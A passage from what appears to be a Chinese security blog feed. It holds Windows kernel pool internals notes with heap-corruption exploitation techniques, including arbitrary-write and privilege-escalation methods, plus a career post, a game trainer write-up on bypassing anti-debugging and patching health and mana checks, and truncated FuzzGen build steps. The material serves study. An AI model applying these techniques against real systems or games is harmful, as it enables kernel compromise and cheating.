Pool</h2><p>非分页内存的数目被记录在nt!ExpNumberOfNonPagedPools，在单核操作系统中，nt!PoolVector的第一个下标指向了non-paged pool的描述符</p><p><code>kd&gt; dt nt!_POOL_DESCRIPTOR poi(nt!PoolVector)</code></p><p>在多核系统下每个核对应的node都有他自己的非分页内存描述符，由nt!ExpNonPagedPoolDescriptor数组里的指针指向。</p><h2 id="Paged-Pool"><a href="#Paged-Pool" class="headerlink" title="Paged Pool"></a>Paged Pool</h2><p>分页内存的数目被记录在nt!ExpNumberOfPagedPools，在单核操作系统中，4个paged pool描述符被定义在nt!ExpPagedPoolDescriptor的1至4下标（Index 1 through 4 in nt!ExpPagedPoolDescriptor）</p><p>在多核系统下每个核对应的node都有一个分页内存描述符</p><p>nt!ExpPagedPoolDescriptor下标为0处是额外的分页描述符为了定义prototype pools / full page allocations</p><h2 id="Session-Paged-Pool"><a href="#Session-Paged-Pool" class="headerlink" title="Session Paged Pool"></a>Session Paged Pool</h2><p>每个用户的都不一样，由nt!MiInitializeSessionPool来初始化。</p><p>win7下池描述符指向如下</p><p><code>KTHREAD-&gt;Process-&gt;Session.PagedPool</code></p><p>Non-paged session由全局的non-paged pool来分配</p><h2 id="Pool-Descriptor-Free-Lists-x86"><a href="#Pool-Descriptor-Free-Lists-x86" class="headerlink" title="Pool Descriptor Free Lists (x86)"></a>Pool Descriptor Free Lists (x86)</h2><p><img src="image-20220312131859710.png" alt="image-20220312131859710"></p><p>这边一部分作者应该是写错了</p><p>照这个算法  (4080+0xf)&gt;&gt;3确实是511</p><p>但是8和24对应的下标应该是2和4而不是1，3.</p><p>这个0xf其实就是为了给header留空间并8字节对齐。</p><h2 id="Kernel-Pool-Header-x86"><a href="#Kernel-Pool-Header-x86" class="headerlink" title="Kernel Pool Header (x86)"></a>Kernel Pool Header (x86)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">kd&gt; dt nt!_POOL_HEADER<br> +<span class="hljs-number">0x000</span> PreviousSize : Pos <span class="hljs-number">0</span>, <span class="hljs-number">9</span> Bits<br> +<span class="hljs-number">0x000</span> PoolIndex : Pos <span class="hljs-number">9</span>, <span class="hljs-number">7</span> Bits<br> +<span class="hljs-number">0x002</span> BlockSize : Pos <span class="hljs-number">0</span>, <span class="hljs-number">9</span> Bits<br> +<span class="hljs-number">0x002</span> PoolType : Pos <span class="hljs-number">9</span>, <span class="hljs-number">7</span> Bits<br> +<span class="hljs-number">0x004</span> PoolTag : Uint4B<br></code></pre></td></tr></table></figure><p>PreviousSize:BlockSize of the preceding chunk</p><p>PoolIndex:Index into the associated pool descriptor array</p><p>BlockSize: (NumberOfBytes+0xF) &gt;&gt; 3</p><p>PoolType: Free=0, Allocated=(PoolType|2)</p><p>PoolTag: 4 printable characters identifying the code  responsible for the allocation</p><h2 id="Kernel-Pool-Header-x64"><a href="#Kernel-Pool-Header-x64" class="headerlink" title="Kernel Pool Header (x64)"></a>Kernel Pool Header (x64)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">kd&gt; dt nt!_POOL_HEADER<br> +<span class="hljs-number">0x000</span> PreviousSize : Pos <span class="hljs-number">0</span>, <span class="hljs-number">8</span> Bits<br> +<span class="hljs-number">0x000</span> PoolIndex : Pos <span class="hljs-number">8</span>, <span class="hljs-number">8</span> Bits<br> +<span class="hljs-number">0x000</span> BlockSize : Pos <span class="hljs-number">16</span>, <span class="hljs-number">8</span> Bits<br> +<span class="hljs-number">0x000</span> PoolType : Pos <span class="hljs-number">24</span>, <span class="hljs-number">8</span> Bits<br> +<span class="hljs-number">0x004</span> PoolTag : Uint4B<br> +<span class="hljs-number">0x008</span> ProcessBilled : Ptr64 _EPROCESS<br></code></pre></td></tr></table></figure><p>BlockSize: (NumberOfBytes+0x1F) &gt;&gt; 4</p><p>ProcessBilled: Pointer to process object charged for  the pool allocation (used in quota management)</p><p>64位变化就三个分别是BlockSize计算方式,多了个eprocess指向分配改内存的进程，256 ListHeads entries。</p><h2 id="Free-Pool-Chunks"><a href="#Free-Pool-Chunks" class="headerlink" title="Free Pool Chunks"></a>Free Pool Chunks</h2><p><img src="image-20220312134131427.png" alt="image-20220312134131427"></p><h2 id="Lookaside-Lists"><a href="#Lookaside-Lists" class="headerlink" title="Lookaside Lists"></a>Lookaside Lists</h2><p>为了更快的分配/释放小内存</p><p><code>单向链表 LIFO</code></p><p><code>为性能做了优化 即没有检查</code></p><p>每个处理器都有他的lookaside lists(for pagable  and non-pagable allocations)</p><p><code>定义在KPCRB中</code></p><p><code>最大BlockSize是0x20即256字节</code></p><p><code>按照8字节递增，所以每种list有32个</code></p><p>这边的256字节是已经算上了head的256字节所以是0x20</p><p>GENERAL_LOOKASIDE_POOL定义了每个lookaside list</p><p><img src="image-20220312140627548.png" alt="image-20220312140627548"></p><p>Session的忽略，暂不考虑。</p><h2 id="Large-Pool-Allocations"><a href="#Large-Pool-Allocations" class="headerlink" title="Large Pool Allocations"></a>Large Pool Allocations</h2><p>分配大小超过4080字节</p><p>由nt!ExpAllocateBigPool来处理</p><p><code>间接调用nt!MiAllocatePoolPages</code></p><p><code>请求的大小会被四舍五入到最接近页的大小</code></p><p><code>请求剩下的空闲块会被放到对应的池描述符的ListHeads链表里</code></p><p>每个处理器都有四个lookaside lists单向链表，为了big pool allocation而准备</p><p><code>1个是为了分页内存</code></p><p><code>3个是为非分页</code></p><p><code>都定义在KNODE (KPCR.PrcbData.ParentNode)中</code></p><p>如果lookaside lists被ban操作系统就会使用bitmap来获取需要的页</p><p><code>每个bit位都表示了正在使用的页</code></p><p><code>由RTL_BITMAP定义</code></p><p><img src="image-20220312151217350.png" alt="image-20220312151217350"></p><h2 id="Allocation-Algorithm"><a href="#Allocation-Algorithm" class="headerlink" title="Allocation Algorithm"></a>Allocation Algorithm</h2><p>顺序如下</p><p>Lookaside list(s)  &gt;   ListHeads list(s)  &gt;  Pool page allocator</p><p>win7在取出一个free chunk后会进行unlink操作</p><p><img src="image-20220312153130972.png" alt="image-20220312153130972"></p><p>简单来说就检查前一个chunk的flink和后一个chunk的blink是否正确指向了需要被ulink的chunk</p><p>伪代码如下这边直接贴原图了</p><p><img src="image-20220312153451750.png" alt="image-20220312153451750"></p><p><img src="image-20220312153500233.png" alt="image-20220312153500233"></p><p>如果从ListHeads[n]中返回的chunk大小比需求的大，就会进行分割。</p><p>如果是在页开头即prevsize=0的，那么就会返回chunk头部</p><p>否则返回尾部</p><p>剩下的chunk会放在ListHeads[n]的末尾</p><p><img src="image-20220312172719376.png" alt="image-20220312172719376"></p><h2 id="Free-Algorithm"><a href="#Free-Algorithm" class="headerlink" title="Free Algorithm"></a>Free Algorithm</h2><p>free算法会检查pool header并把它释放到正确的list，为了减少内存碎片连续的free chunks可能会被合并。</p><p>ExFreePoolWithTag流程如下</p><p><img src="image-20220312172901824.png" alt="image-20220312172901824"></p><p><img src="image-20220312172910202.png" alt="image-20220312172910202"></p><p>合并流程如下</p><p><img src="image-20220312173044434.png" alt="image-20220312173044434"></p><p>可以注意的是，free过程中如果chunk不在页开头回去检测next chunk的prevsize，当出现前几个字节不可控的池溢出时可以把chunk布局到页末尾来防止bsod。</p><h2 id="Delayed-Pool-Frees"><a href="#Delayed-Pool-Frees" class="headerlink" title="Delayed Pool Frees"></a>Delayed Pool Frees</h2><p>延迟释放机制是为了快速分配/释放而设计的</p><p>当MmNumberOfPhysicalPages &gt;= 0x1fc00就会启用</p><p><code>Equivalent to 508 MBs of RAM on IA-32 and AMD64</code></p><p><code>nt!ExpPoolFlags &amp; 0x200</code></p><p>每一次调用ExFreePoolWithTag都会在延迟释放链表（单向链表）中增加一个chunk</p><p><code>Current number of entries is given by PendingFreeDepth</code></p><p><code>The list is processed by the function ExDeferredFreePool if it  has 32 or more entries</code></p><p>函数流程如下</p><p><img src="image-20220312214235884.png" alt="image-20220312214235884"></p><h1 id="ExAllocatePoolWithTag-x64"><a href="#ExAllocatePoolWithTag-x64" class="headerlink" title="ExAllocatePoolWithTag(x64)"></a>ExAllocatePoolWithTag(x64)</h1><p>ida7.5反编译的代码丑的一</p><p>有很多结构体还需要自己设置，最重要的还是最后的unlink实现，前面了解下逻辑就够了。</p><p><img src="image-20220313161741951.png" alt="image-20220313161741951"></p><p>验证size是否&gt;0xfe0，32位下是ff0，因为俩个blocksize的算法不一样，64位下是bytes+0x1f，32位是+0xf所以这边验证是否大于0xfe0</p><p>然后判断是否按照页对其和大小是否超过一个页来进行对应的分配</p><p><img src="image-20220313162938437.png" alt="image-20220313162938437"></p><p>然后判断pooltype是否为paged pool，计算blocksize来选择对应的lookaside lists</p><p><img src="image-20220313163045816.png" alt="image-20220313163045816"></p><p>nonpagedpool情况如上</p><p>如果blocksize&gt;0x20</p><p>下面就会进行listheads遍历</p><p><img src="image-20220313164923505.png" alt="image-20220313164923505"></p><p>关于safe unlink操作如下</p><p><img src="image-20220313165752682.png" alt="image-20220313165752682"></p><p>unlink后会验证blocksize和待分配的是否相等是否页对齐来判断是否需要进行一个split entry操作</p><h1 id="ExFreePoolWithTag-x64"><a href="#ExFreePoolWithTag-x64" class="headerlink" title="ExFreePoolWithTag(x64)"></a>ExFreePoolWithTag(x64)</h1><p><img src="image-20220313182326244.png" alt="image-20220313182326244"></p><p>判断nextchunk的prevsize是否与blocksize相等</p><p>下面是根据pooltype和blocksize来选择合适的lookaside list</p><p><img src="image-20220313182554224.png" alt="image-20220313182554224"></p><p>然后是DELAY_FREE pool标志判断然后进行相应的操作</p><p><img src="image-20220313184205978.png" alt="image-20220313184205978"></p><p>后面紧跟着的是merge操作</p><p><img src="image-20220313184352212.png" alt="image-20220313184352212"></p><p>merge完后会判断是否为整页如果是的话直接调用MiFreePoolPages否则添加到listheads list中去</p><p><img src="image-20220313185239225.png" alt="image-20220313185239225"></p><h1 id="Kernel-Pool-Attacks"><a href="#Kernel-Pool-Attacks" class="headerlink" title="Kernel Pool Attacks"></a>Kernel Pool Attacks</h1><p>下面讲解几种常用的攻击方式</p><h2 id="Traditional-ListEntry-Attacks-lt-Windows-7"><a href="#Traditional-ListEntry-Attacks-lt-Windows-7" class="headerlink" title="Traditional ListEntry Attacks (&lt; Windows 7)"></a>Traditional ListEntry Attacks (&lt; Windows 7)</h2><p>win7前在进行unlink时并不会进行check来验证flin和blink是否合规</p><p><img src="image-20220312230728966.png" alt="image-20220312230728966"></p><p><img src="image-20220312230738585.png" alt="image-20220312230738585"></p><p>上面俩种覆写ListHeads都可以间接修改chunk的大小，导致内存重叠，然后完全可控。</p><h2 id="ListEntry-Flink-Overwrite"><a href="#ListEntry-Flink-Overwrite" class="headerlink" title="ListEntry Flink Overwrite"></a>ListEntry Flink Overwrite</h2><p>win7使用了safe unlink来验证LIST_ENTRY的指针是否合规，但是他不会验证flink</p><p>构造一个chunk，这种利用对ListHeads[n]有要求就是chunk数目不小于2</p><p>//原因很简单，如果只有一个，在进行构造fakeentry后 listentry的blink不会改变，下一次过不了check</p><p>//为了防止蓝屏可以让指向的fakeentry的flink指向listentry本身，没试验过理论上应该可行</p><p><img src="image-20220312231425488.png" alt="image-20220312231425488"></p><p>进行unlink后</p><p><strong>ListHeads[n].Flink</strong> = FakeEntry</p><p><strong>FakeEntry.Blink</strong> = ListHeads[n]</p><p>FakeEntry可控，利用方式就是写个用户态地址，这样下一次分配就会在我们可控的地址。</p><p><img src="image-20220312233606903.png" alt="image-20220312233606903"></p><h2 id="Lookaside-Pointer-Overwrite"><a href="#Lookaside-Pointer-Overwrite" class="headerlink" title="Lookaside Pointer Overwrite"></a>Lookaside Pointer Overwrite</h2><p>chunk被放入lookaside lists条件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">BlockSize</span> &lt;= <span class="hljs-number">0</span>x<span class="hljs-number">20</span> for paged/non-paged pool chunks<br><span class="hljs-attribute">BlockSize</span> &lt;= <span class="hljs-number">0</span>x<span class="hljs-number">19</span> for paged session pool chunks<br><span class="hljs-attribute">Lookaside</span> list for target BlockSize is not full<br><span class="hljs-attribute">Hot</span>/cold page separation is not used<br></code></pre></td></tr></table></figure><p>因为lookasde lists是个单向链表，覆写就可以达到任意地址分配。</p><p><img src="image-20220313192704619.png" alt="image-20220313192704619"></p><p>页被放入lookaside lists条件</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">NumberOfPages = <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> paged pool pages<br>NumberOfPages &lt;= <span class="hljs-number">3</span> <span class="hljs-keyword">for</span> non-paged pool pages<br>Lookaside list <span class="hljs-keyword">for</span> target page count <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">full</span><br>Size <span class="hljs-keyword">limit</span> determined <span class="hljs-keyword">by</span> physical page count <span class="hljs-keyword">in</span> <span class="hljs-keyword">system</span><br></code></pre></td></tr></table></figure><p>A pointer overwrite of lookaside pages requires at  most a pointer-wide overflow</p><p>因为free pool pages没有pool header</p><p><img src="image-20220313193149716.png" alt="image-20220313193149716"></p><h2 id="PendingFrees-Pointer-Overwrite"><a href="#PendingFrees-Pointer-Overwrite" class="headerlink" title="PendingFrees Pointer Overwrite"></a>PendingFrees Pointer Overwrite</h2><p>延迟释放链表也是单向链表</p><p>和上一种攻击方式类似，覆写flink为用户态地址，用户态地址可控。</p><p>然后构造的fake chunk链表里next pointer必须是null来表明这个单向链表结束。</p><p><img src="image-20220313194116696.png" alt="image-20220313194116696"></p><p>步骤</p><figure class="highlight irpf90"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs irpf90"><span class="hljs-keyword">Free</span> a chunk to the <span class="hljs-keyword">deferred</span> <span class="hljs-keyword">free</span> list<br>Overwrite the chunk’s next <span class="hljs-keyword">pointer</span><br> -Or <span class="hljs-built_in">any</span> of the <span class="hljs-keyword">deferred</span> <span class="hljs-keyword">free</span> list entries (<span class="hljs-number">32</span> <span class="hljs-keyword">in</span> total)<br>Trigger processing of the <span class="hljs-keyword">deferred</span> <span class="hljs-keyword">free</span> list<br> -Attacker controlled <span class="hljs-keyword">pointer</span> freed to designated <span class="hljs-keyword">free</span> list<br>Force allocation of the controlled list <span class="hljs-built_in">entry</span><br> -Allocator returns user-mode address<br>Corrupt <span class="hljs-built_in">allocated</span> <span class="hljs-built_in">entry</span><br>Trigger <span class="hljs-keyword">use</span> of corrupted <span class="hljs-built_in">entry</span><br></code></pre></td></tr></table></figure><h2 id="PoolIndex-Overwrite"><a href="#PoolIndex-Overwrite" class="headerlink" title="PoolIndex Overwrite"></a>PoolIndex Overwrite</h2><p>这个相对来说复杂了很多</p><p>PoolIndex代表了chunk在对应池描述符里的下标</p><p>打法需要借助0页，64位下已经不能了分配0页了，因为这个slides比较老11年的，这边就不写了。</p><h2 id="Quota-Process-Pointer-Overwrite"><a href="#Quota-Process-Pointer-Overwrite" class="headerlink" title="Quota Process Pointer Overwrite"></a>Quota Process Pointer Overwrite</h2><p>这种利用在实战的时候不经常用（我不常用，当然上报漏洞可以），除非数据完全可控，因为实战情况下往往不一定数据完全可控，会造成一定程度的内存破坏，需要进行修复，否则进程退出就蓝屏。</p><p>这种攻击方式可以达成任意地址减一。对修复不太友好。</p><p>利用方式很好理解，当chunk被free时会根据eprocess找到对应的引用技术进行-1操作。覆写eprocess为用户态地址即可，然后可达成任意地址-1，64位和32位有一些区别。</p><p><img src="image-20220313194940466.png" alt="image-20220313194940466"></p><p>用户态伪造eprocess然后把EPROCESS_QUOTA_BLOCK处指向需要-1的地址</p><p><img src="image-20220313195113201.png" alt="image-20220313195113201"></p><p>一般减1的地址会选择权限处，具体有点忘了，然后通过注入system权限进程启cmd达成提权。</p><h1 id="Summary-of-Attacks"><a href="#Summary-of-Attacks" class="headerlink" title="Summary of Attacks"></a>Summary of Attacks</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash">Corruption of busy pool chunk</span><br><span class="hljs-meta"> &gt;</span><span class="bash">BlockSize &lt;= 0x20</span><br><span class="hljs-meta">  &gt;</span><span class="bash">PoolIndex + PoolType/BlockSize Overwrite</span><br><span class="hljs-meta">  &gt;</span><span class="bash">Quota Process Pointer Overwrite</span><br><span class="hljs-meta"> &gt;</span><span class="bash">BlockSize &gt; 0x20</span><br><span class="hljs-meta">  &gt;</span><span class="bash">PoolIndex (+PoolType) Overwrite</span><br><span class="hljs-meta">  &gt;</span><span class="bash">Quota Process Pointer Overwrite</span><br><span class="hljs-meta">&gt;</span><span class="bash">Corruption of free pool chunk</span><br><span class="hljs-meta"> &gt;</span><span class="bash">BlockSize &lt;= 0x20</span><br><span class="hljs-meta">  &gt;</span><span class="bash">Lookaside Pointer Overwrite</span><br><span class="hljs-meta"> &gt;</span><span class="bash">BlockSize &gt; 0x20</span><br><span class="hljs-meta">  &gt;</span><span class="bash">ListEntry Flink Overwrite / PendingFrees Pointer Overwrite</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>分享一波工作经历</title>
    <link href="/2022/02/27/%E5%88%86%E4%BA%AB%E4%B8%80%E6%B3%A2%E5%B7%A5%E4%BD%9C%E7%BB%8F%E5%8E%86/"/>
    <url>/2022/02/27/%E5%88%86%E4%BA%AB%E4%B8%80%E6%B3%A2%E5%B7%A5%E4%BD%9C%E7%BB%8F%E5%8E%86/</url>
    
    <content type="html"><![CDATA[<p>博客一年没更新，主要是因为大三忙着找工作，最近会陆陆续续分享一些知识。</p><a id="more"></a><h1 id="春招"><a href="#春招" class="headerlink" title="春招"></a>春招</h1><p>大三开学那段时间把，3月5号左右开始投递的简历，主要投了三家，腾讯，字节和阿里，最后还是去了阿里的归零实验室，三月底面完加上hr面就三轮。整体难度不大，四月初拿到offer就去实习了。分享一波面经(仅部分能回忆上来的)</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs diff">漏洞挖掘<br><span class="hljs-deletion">-主要是讲我自己平时挖的几个逻辑洞，有个从任意文件删除到权限提升的漏洞</span><br>windows保护 linux保护<br><span class="hljs-deletion">-这个不多说，网上很多</span><br>有没有写过什么插件<br>浏览器漏洞有没有了解过<br></code></pre></td></tr></table></figure><p>大致就这些，主要是问我自己挖的漏洞，俩次面试都问到了这个，讲老半天，估计到时间了也没多问其他的问题233.</p><h1 id="实习经历"><a href="#实习经历" class="headerlink" title="实习经历"></a>实习经历</h1><p>阿里安全的归零实验室，团队氛围是特别不错的，主要工作都是针对黑灰产，让黑灰产“归零”，还要让烤全羊“归零”，还真就内个疯狂吃烤全羊，4月份开始实习，三个月吃了三四次烤全羊，吃的我现在都有点怕，印象最深的是8月份，一个星期吃俩次羊。吃懵了都，体重直飙86kg，所以说团队氛围特别好，经常聚餐，不是烧烤就是烤全羊烤鱼。</p><p>工作内容也挺杂，对我来说难度还是有的</p><p>前一个月负责免杀，一开始还没怎么接触过，现在慢慢开始有自己的思路了</p><p>后面半个多月从0到1负责v8，主要是负责写exp，复现v8 nday</p><p>后续就开始写windows内核的exp了，如cve-2021-31956</p><p>中间陆陆续续还有一些逆向的活，写爬虫等。</p><p>整体上跨度很大，但对我个人的提升还是很多的，实习的一段时间学到了很多思路。</p><p>当然甲方公司并不像想象中那样，以武艺论高低。</p><p>“公司不会看你有多厉害，只会看你做的事情对他们有没有价值”</p><p>尤其记得师兄和我说的别忘了初心，做技术的向来都在底层，对我影响还是挺大的，社会确实操蛋，残酷的现实会不断动摇你学安全的初心，当初入门就是因为热爱，想做研究做一些nb的事情。</p><p>但是在公司就不一样了，不管做什么一定要对“业务”有价值，可能大家都争着去做一些简单而又容易出成果的活吧，再用言语包装一下显得很厉害就能交差了。</p><p>这样专注于“low-hanging fruit”。</p><p>在甲方公司混的风生水起。</p><p>这对我冲击挺大的，像以前总是想做一些nb的事情，挖个漏洞，逆个大项目。工作后想的就是如何把果子摘下来，摘来下后就不管了，目标达成，结束，不会抽出很多时间去消化品味这枚果子。而是想怎么摘下来下一棵，下一棵果子他高吗？容不容易摘？是否需要换一颗树，要知道眼前是一望无际的果林。</p><p>时间长了，可能我都看不到树顶的果子了吧。甚至以前能爬的树都爬不上去了。</p><p>而且不知道为什么，感觉工作时间长了，自己的”语言包装能力“会有很大的提升。</p><p>一开始我并没有意识到这点。怀着满腔热血。实习那段日子我每天疯狂的学习，在那写exp，又是v8又是内核的，确实很难，对于我一个萌新来讲，但是我很喜欢因为这是我想要的，挑战高难度的事情才会有趣，才能获得更大的成就感。</p><p>一开始的初衷还是挖0day，后来才发现做的又累，业务又不好落地，和别人相比起来落差感太大了。当初的第一个感觉就是run，滚回去做逆向吧，相对于这个还是轻松（当时是这么想的），正好转正成功了，又赶上开学，在9月底我选择了离职。</p><p>//要知道研究和实战是有很大的区别的，一个漏洞的品相，稳定性，做研究只需要打掉就完事了，你可以用很多花里胡哨的打法，但是运用到实战需要考虑很多，比如版本，稳定性，进程退出后会不会蓝屏，还需要做修复等等。</p><p>有时候真的是想摆烂，做研究做的累死累活的业务还难落地，不如做做渗透，反正又不是挖什么tp框架的0day，拿着别人造的子弹冲就完事了。</p><p>”专注对公司有价值的事情“，你懂的。</p><p>不知不觉中，我当初入门这一行的初心已经被动摇了。</p><p>可现实就摆在眼前，就是这样残酷，要么选择离开，要么选择加入。</p><h1 id="校内生活"><a href="#校内生活" class="headerlink" title="校内生活"></a>校内生活</h1><p>回到学校做的第一个事情就是健身，去了学校附近的一个健身房，练了三个月，体重掉到了76kg，当然那是1月初，过了个年我都没咋练过现在应该反弹起飞了。</p><p>偶尔学点渗透玩，还有驱动开发。当时还面了腾讯的游戏安全岗位，俩面评级都是a+，sp的offer。</p><p>这也是动摇我初心的另一个原因，他妈的一年多没碰逆向了（20年11月起就在学windows权限的知识，挖逻辑洞。），啃老本搁那聊天就面了个a+，组长问了我几个问题后开始问我脑筋急转弯了，大家一起乐呵呵，二面总监面也是，一开始问了几个问题然后开始和我聊天了，有没有女朋友，你来深圳工作你女朋友怎么办，你有什么缺点，有什么优点，就唠嗑，唠就完事了。结果俩面评级都是a+。直接给我整麻了。</p><p>差不多在11月份的时候，师兄离职了（离职原因很复杂就不透露了），还就内个晴天霹雳，这还去个锤子，去了就我一人是二进制我搞毛。</p><p>不如去游戏安全这块，反正俩边都是甲方做业务的，游戏这块反而落地容易，逆向&amp;开发。</p><p>//本来是这么打算的</p><p>纠结了很长时间，考虑到地域环境(本人十分害怕蟑螂，深圳真的有点害怕的。哪怕开的不低。而且同样的价格，南山区4000块钱租的房子和监狱里的牢房一样。这么压抑的环境谁顶得住？)消费水平和房价深圳和杭州绝壁不是一个级别的，而且我还没去实习过万一有坑岂不是很惨？况且阿里的主管人很好，很有凝聚力，团队氛围很不错。虽然一个人苦了点，但是天花板相对来说高了。跳槽方便，假如去了游戏安全，特别对于我这种pc端的，跳槽选择面就窄了。</p><p>（游戏安全的天花板相对这边来说低，但这个低与否取决于你是否摆烂。游戏安全也在不断更新迭代，去年年中，fps类游戏的外挂基于深度学习写的，直接爆头，怎么检测？）</p><p>最终还是选择了留在阿里，其实说到这个我还挺对不起腾讯的组长的，这期间有什么问题我都在问他，包括学习路线什么的。。。后面我都没脸找他了。不好意思了都，拒绝掉他后又有俩个游戏部门来找我，也都拒了。</p><p>至于日后的工作只能说走一步是一步吧，趁着毕业前这段时间赶紧补补，把想学的想做的都抓紧办了，以后可能就没多少时间了。</p><p>个人的兴趣爱好还是放在工作之余吧。</p><h1 id="鸡汤"><a href="#鸡汤" class="headerlink" title="鸡汤"></a>鸡汤</h1><p>当时转正面时几个大佬说的话。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">君故师兄：别忘了学安全的初心。<br>入侵：多研究，搞懂每个结构体成员的意思，多去做做分享。<br>周拓：前两年精力花在研究上，钻的深一点，等到后续再考虑业务其实问题不大的。<br></code></pre></td></tr></table></figure><p>当时确实没听懂，我也不确定我现在搞懂了没有。只能说大佬还是大佬，看的远一些。可能君故师兄知道甲方公司对研究的不友好吧，才提醒勿忘初心，学安全的初心是什么，对待安全这是工作还是爱好。</p><p>做自己喜欢的事情。</p><p>写下这篇博客，希望能一直保持下去。</p><p>工作是为了生活，研究是为了爱好。</p>]]></content>
    
    
    
    <tags>
      
      <tag>话疗</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>嗜血印trainer</title>
    <link href="/2022/02/27/%E5%97%9C%E8%A1%80%E5%8D%B0trainer/"/>
    <url>/2022/02/27/%E5%97%9C%E8%A1%80%E5%8D%B0trainer/</url>
    
    <content type="html"><![CDATA[<p>过年的时候分析的，感觉还挺好玩，写篇博客分享下。</p><a id="more"></a><p>首先是定位血条和蓝，用ce直接搜索就行了，进入测试模式因为9键可以回蓝开个技能然后搜索减少的数值，然后按9搜索变大的数值不断重复个几次就能定位到蓝量or血条。</p><p>右击查看哪边写入改地址后程序闪退，第一反应ThreadHideFromDebugger。简单来说就是debugport清零，调试器虽然可以附加上去但是收不到调试事件，像这边用的内存断点本质是修改页属性，但调试器收不到调试事件，程序跑到那后异常又没调试器接受处理就自然闪退了。</p><p>直接打开ce设置选用veh debugger即可。</p><p><img src="image-20220226200228223.png" alt="image-20220226200228223"></p><p>血量和蓝的内存相邻，float类型布局大概如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">当前血量<br>血量上限<br>当前蓝量<br>蓝量上限<br></code></pre></td></tr></table></figure><p>按键1，2，3释放技能分别由不同的几个地方来处理扣蓝，分别hook即可，最简单的方法就是hook到9键(回蓝)那，这样就达成不扣蓝</p><p>扣血直接nop即可</p><p>这是一般的处理方式，但这个游戏有个好玩的点。</p><p><img src="image-20220226200853955.png" alt="image-20220226200853955"></p><p>程序开辟了一块内存，把所有的代码重定位后写入内存然后运行的，就是说代码的基地址是随机的，不能像常规的那样找偏移然后根据主程序的基地址+偏移来实现外挂。</p><p>但不是没办法处理，暴力搜索机器码定位就行了，和之前写ssdthook的时候很像，然后进一步定位出血条和蓝量的地址，后12位是固定的。</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fuzzgen build instructions</title>
    <link href="/2022/02/27/fuzzgen-build-instructions/"/>
    <url>/2022/02/27/fuzzgen-build-instructions/</url>
    
    <content type="html"><![CDATA[<p>fuzzgen的完整安装过程和简单使用</p><a id="more"></a><h1 id="fuzzgen-amp-llvm"><a href="#fuzzgen-amp-llvm" class="headerlink" title="fuzzgen&amp;llvm"></a>fuzzgen&amp;llvm</h1><p>这部分github上有人提了issue，写的挺全的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#Clone Fuzzgen</span><br><br>git <span class="hljs-built_in">clone</span> https://github.com/HexHive/FuzzGen<br><span class="hljs-comment">#Build LLVM-6.0.0 (Taken from #19 and modified)</span><br><br>git <span class="hljs-built_in">clone</span> https://github.com/llvm/llvm-project<br><span class="hljs-built_in">cd</span> llvm-project<br>git checkout llvmorg-6.0.0<br>cp -r FuzzGen/src/preprocessor/ llvm-project/clang/tools/fuzzgen/ (The Readme said <span class="hljs-variable">$LLVM_SRC</span>/tools/clang/tools but there is no tools directory <span class="hljs-keyword">in</span> llvm-project/)<br><span class="hljs-comment">#Open llvm-project/clang/tools/CMakeLists.txt and add add_clang_subdirectory(fuzzgen) (anywhere in the code or preferably at the end?)</span><br>mkdir build<br><span class="hljs-built_in">cd</span> build<br>cmake -DLLVM_ENABLE_PROJECTS=clang -DLLVM_PARALLEL_LINK_JOBS=8 -DLLVM_USE_LINKER=gold -DCMAKE_BUILD_TYPE=Release -G <span 